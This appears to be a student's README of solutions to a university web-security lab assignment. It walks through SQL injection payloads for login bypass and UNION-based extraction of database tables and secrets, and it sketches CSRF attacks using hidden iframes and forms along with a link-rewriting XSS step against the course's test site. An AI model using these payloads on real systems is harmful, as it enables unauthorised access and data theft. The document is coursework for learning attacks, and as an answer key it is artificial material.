# MP2 - WebSec
##### Instructor: Adam Bates & Ling Ren
CP1 Deadline --- Wednesday, September 27th, 6:00PM

CP2 Deadline --- Thursday, October 6th, 6:00PM

## Project Setup
1. Download VMWare
2. Download Ubuntu 18.04 LTS (CS461 Virtual Machine) at [here](https://uofi.box.com/s/aqaixm5igvqbyxys7gpswxgcsf7nyqo6)
3. Setup the VM in VMWare 

## Build Project
None

## Implementation
#### 2.2.1.1
Type the following command in `Username`
```
victim
```
Type the following command in `Password`
```
' OR 1=1 -- 
```
#### 2.2.1.2
Type the following command in `Username`
```
victim
```
Type the following command in `Password`
```
\' OR 1=1 -- 
```
#### 2.2.1.3
Write a python script to mine `md5` hash

Type the following command to run the python script `2.2.1.3.py`
```
./2.2.1.3.py
```
The `passwd` got from the python script are
* `61873882145751551400929987756087961` [35-digit]
* `1107388038190758764683658965752877062` [37-digit]


#### 2.2.1.4
##### 1. Figure out how many columns there are in the table with the following command
```
' OR 1=1 ORDER BY 1; -- 
' OR 1=1 ORDER BY 2; -- 
' OR 1=1 ORDER BY 3; -- 
' OR 1=1 ORDER BY 4; -- 
' OR 1=1 ORDER BY 5; -- 
```
The last command will give you an error. Therefore, there are 4 columns in the table.

##### 2. Use the following command to get the `Database Name`
```
' UNION SELECT NULL,NULL,NULL,DATABASE(); -- 
```

##### 3. Use the following command to get the `Database Version`
```
' UNION SELECT NULL,NULL,NULL,version(); -- 
```
Or use the following alternative command
```
' UNION SELECT NULL,NULL,NULL,@@version; -- 
```

##### 4. Use the following command to get all `Table` in the Database
```
' UNION SELECT NULL,NULL,NULL,GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='proj2_inject3'; --
```

##### 5. Use the following command to get all `Column` in Table `HINT`
```
' UNION ALL SELECT NULL,NULL,NULL,GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='HINT'; -- 
```
The `column_name` got from Table `HINT` are _id_ and _message_

Use the following command to get `message` from Table `HINT` with `id=1`
```
' UNION SELECT NULL,NULL,NULL,message FROM HINT WHERE id='1'; -- 
```
The `message` from table `HINT` with `id=1` is _go to table SECRET and get a secret string from row with your md5(netid)_

Use the following command to get all `Column` in Table `SECRET`
```
' UNION ALL SELECT NULL,NULL,NULL,GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='SECRET'; -- 
```
The `column_name` got from Table `SECRET` are _hash_, _id_, and _secret_

Use the following command to get `md5(netid)`
```
./md5.py
```

Then, use the following command to get `secret` from Table `SECRET` with the `hash=md5(netid)`
```
' UNION SELECT NULL,NULL,NULL,secret FROM SECRET WHERE hash='3168622a73961f1d17b1a105be567177'; -- 
```

#### 2.2.2.1
Create &lt;iframe&gt; that displays nothing

&lt;form&gt; `action`=http://bungle-cs461.csl.illinois.edu/login

Log in with following infomation:
* `csrfdefense`=0
* `xssdefense`=5
* `username`=attacker
* `password`=l33th4x

#### 2.2.2.2
Create &lt;iframe&gt; that displays nothing

Go to original [`Bungle` website](http://bungle-cs461.csl.illinois.edu/)

Right click on search window, and click `Inspect Element`

* The `name`=q

Right click on either `username` or `password` window, and click `Inspect Element`

* &lt;input type="hidden" name="csrf_token" value="9165db97e970e7d9facd256db1fdf2f8"&gt;

Submit 2 HTML &lt;form&gt; with function `submitForm()`
* Both of them use `target`=ifrm
* The first form use `action`=http://bungle-cs461.csl.illinois.edu/search
* The second form use `action`=http://bungle-cs461.csl.illinois.edu/login

#### 2.2.3.1
Go to Website [here](http://bungle-cs461.csl.illinois.edu/multivac/?name=INSERT%20ATTACK%20HERE)

Right click on the hyperlink `Click me` and click `Inspect Element`

* &lt;a href="http://cs.illinois.edu/"&gt;Click me&lt;/a&gt;

Use the function `getElementsByTagName` to search for the first `a` and replace its `href` with the following

* http://ece.illinois.edu/

#### 2.2.3.2

## Developers
* Hongbo Zheng [NetID: hongboz2]
* Max Song [NetID: mcsong2]